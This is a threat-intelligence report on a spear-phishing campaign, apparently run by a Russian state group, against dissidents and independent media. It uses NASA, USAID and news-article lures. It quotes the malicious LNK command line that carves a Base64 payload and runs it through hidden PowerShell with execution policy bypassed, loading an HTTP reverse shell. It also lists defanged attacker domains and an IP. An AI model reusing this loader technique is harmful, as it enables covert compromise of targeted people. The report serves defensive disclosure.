The Bear and The Shell: New Campaign Against Russian
Opposition
Cluster25 Threat Intel Team ⋮ ⋮ 1/30/2024
By Cluster25 Threat Intel Team

January 30, 2024
Cluster25 uncovered a newly initiated campaign likely associated with a Russian APT (Advanced Persistent
Threat) group. The spear-phishing messages employed in this campaign targeted entities that were openly critical
of the Russian government and aligned with Russian dissident movements, both within and beyond the nation's
borders.
The attack analyzed by Cluster25 employed a NASA-themed lure to deceive the victim to execute an open-
source multiplatform reverse shell named as HTTP-Shell. During the investigation, Cluster25 researchers
found many other artifacts related to attacks having the same TTPs and conducted in the same days, discovering
that the first note about this malicious campaign was made public by the Netherlands-based investigative
journalism group Bellingcat on X social network. 
All of the analyzed attacks could be considered as belonging to the same campaign and related to the same
threat actor.
INSIGHTS
NASA-themed Attack
The first stage of the attack consists of a ZIP file (756bb560e21453ac09215cc9aae9dc1a) named
“NASA_Job_Offer(2).zip” which contains a single LNK file disguised as a PDF titled “Offer.pdf”
2/8
(f2bc317ce04727cc99cfb6225e2a2802).
LNK TARGET
/c start /B findstr /R "CiRFcnJvckFjdGlvbl" Offer.pdf.lnk > "%tmp%\Temp.jpg" & start /B pOwERsHElL -
windowstyle hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -c "
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String((Get-Content "%tmp%\Temp.jpg"))) |
POwERsHElL"
The PowerShell script searches for the string pattern "CiRFcnJvckFjdGlvbl" in the LNK file using the findstr utility,
then it redirects the output to a file named “Temp.jpg” in the %TEMP% directory and finally it executes the
resulting Base64-decoded PowerShell command.
The executed Powershell script belongs to an open-source project calledHTTP-Shell, which is a Multiplatform
Reverse Shell working over HTTP. As stated on the official HTTP-Shell page, “the main goal of the tool is to
use it in conjunction with Microsoft Dev Tunnels, in order to get a connection as close as possible to a
legitimate one”.
Among its capabilities, the shell is able to upload and download files, to auto-reconnect to the C&C, and to
move between directories. The command and control was chosen to appear as much as possible like a
legitimate PDF editing site to decrease the detection rate.

Meanwhile, the following PDF lure regarding NASA “Reasonable Accommodations Procedures for Individuals
with Disabilities” is displayed to the victim.
RELATED ATTACKS
While investigating the aforementioned attack, Cluster25 researchers discover additional campaigns that with
high probability are related to the same threat actor, since they all use the same kill chain with identical shortcut
icons. 
Moreover, some of them use a similar lure (like USAID-themed attack) and share the same C&C server. 
First Lure
First seen: 2023-12-19
The first lure found is linked to USAID, the United States Agency for International Development, that is an
independent agency of the United States government primarily responsible for administering civilian foreign aid
and development assistance. This is the lure used in the phishing attack against Bellingcat, as stated in the
introduction. The lure was related to the 2023 Annual report of the US Agency. But the used PDF is actually a
document called “USAID Shooting guide”, a booklet on how to shoot better documenting photos for the Agency’s
interviews.

This sample employs the same command and control server of the NASA-themed attack.

Second Lure
First seen: 2023-12-19
The second lure used by the threat actor is an article originally posted by Осторожно Media, a media outlet
related to Ksenia Sobchak, a Russian socialite, television presenter, and businesswoman. She has been a vocal
critic of Russian President Vladimir Putin and has expressed support for democracy and human rights. The
article is about Ayaz Shabutdinov, a businessman and blogger who has been accused of fraud, in relation to his
educational company called Like and their business courses. Shabutdinov is being investigated by the police after
eight people filed complaints against him.
This attack, along with the ones employing all the subsequent lures in this report, shares the same command
and control server.

Third Lure
First seen: 2024-01-11
5/8
The third lure is an article written by the media outlet The Bell. The founder of the project is Elizaveta
Osetinskaya,  a Russian journalist and media manager, former editor-in-chief of  RBC, the Russian version of
Forbes magazine and also the Vedomosti newspaper. Osetinskaya condemned the 2022 Russian invasion of
Ukraine, and then on April 1, 2022, she was declared foreign agent by the Russian Ministry of Justice. The
article speaks about  how social media is being used to spread misinformation during the Israel-Hamas conflict. 
Fourth Lure
First seen: 2024-01-12
Also the fourth lure is an article written by the media outlet The Bell. This article is about how the Russian
social network VK is used as a tool to spread political content towards Russians. Two years ago, VK
changed ownership and leadership, transitioning from Alisher Usmanov to Yuri Kovalchuk and Gazprom Media,
marketing a strategic shift in the company's objectives within the controlled environment of the Russian internet
(RuNet).
Fifth Lure
First seen: 2024-01-12
6/8
The fifth lure is an article shared by Verstka, a socio-political publication launched on April 26th 2022 as a
response to the Russian censorship of the media after the start of the Ukraine war. This outlet is led by
independent journalists. The article used as a lure is about how some pardoned Wagner Group fighters have
continued to commit crimes after returning to Russia. It discusses the number and the types of crimes they have
committed and the sentences they have received, being strongly critical to the paramilitary organization.
VICTIMOLOGY
As mentioned in the introduction, the spear-phishing emails were directed at organizations that were critical of
the Russian government and supported Russian dissident movements, both within and outside of
Russia. Some of the lures used in the attacks originated from media sources associated within the Russian
independent media sphere. It is worth noting that the first public disclosure of this campaign came from the
Netherlands-based investigative journalism group Bellingcat. They were the first to publish a post on X
detailing information about the attack.
In accordance with Cluster25 telemetry and visibility, activities associated with this campaign have been observed
in various countries worldwide, including Portugal, the USA, and Israel (as reported in the next figure).

ATTRIBUTION
During Cluster25 research, it was noted that the domain used in the attack against Bellingcat usaid[.]pm resolves
an IP address (80.78.26[.]183) that is related to a Sliver beacon of late September 2022. 
Sliver, like HTTP-Shell, is an open-source tool for adversary emulation. So, it is possible that these
infrastructures and tools are related to the same threat actor.
The same IP address was associated with other two domains resembling phishing pages and resulting active in
the same days as usaid[.]pm, from December 18th to 22th:
nasa[.]network probably related to the Nasa-themed attack previously described;
zdg[.]re probably used by the attacker to simulate Ziarul de Gardă (zdg.md), an independent investigative
weekly newspaper in the Republic of Moldova.
Considering the techniques employed during the various observed attacks and the themes used in crafting digital
lures, it is highly plausible that the campaign is linked to an advanced group operating on behalf of the Russian
government against dissident movements both inside and outside of Russia.
